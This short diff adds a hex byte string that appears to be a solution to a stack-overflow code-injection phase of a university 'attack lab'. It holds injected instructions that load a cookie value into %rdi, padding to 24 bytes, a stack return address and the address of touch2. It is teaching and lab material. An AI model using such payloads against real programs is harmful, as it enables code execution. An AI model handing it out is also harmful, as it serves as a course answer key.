@@ -1,0 +1,5 @@
+48 c7 c7 f5 df 52 3e c3 /* move cookie into register %rdi */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* buffer to make it 24 bytes */
+18 9f 62 55 00 00 00 00 /* address of register %rsp */
+74 19 40 00 00 00 00 00 /* address of touch2 */
